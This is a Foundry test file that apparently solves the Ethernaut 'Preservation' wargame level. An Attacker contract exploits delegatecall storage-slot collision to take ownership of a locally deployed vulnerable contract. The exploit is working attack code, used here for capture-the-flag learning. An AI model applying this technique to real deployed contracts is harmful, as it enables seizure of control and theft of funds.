// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "ethernaut/levels/Preservation.sol";

contract PreservationTest is Test {
    Preservation target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        LibraryContract lib1 = new LibraryContract();
        LibraryContract lib2 = new LibraryContract();
        target = new Preservation(address(lib1), address(lib2));
    }

    function attack() private {
        Attacker attacker = new Attacker(address(target));
        attacker.attack();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(player, target.owner(), "player must be the owner");
    }
}

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; // target storage slot!

    Preservation target;

    constructor(address _target) {
        target = Preservation(_target);
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }

    function attack() external {
        // this call causes `timeZone1Library` to point to our attacker contract
        target.setFirstTime(uint256(uint160(address(this))));

        // and then we call our attacker contract's `setTime` defined above, which
        // overwrites the `owner` slot with our address
        target.setFirstTime(uint256(uint160(msg.sender)));
    }
}
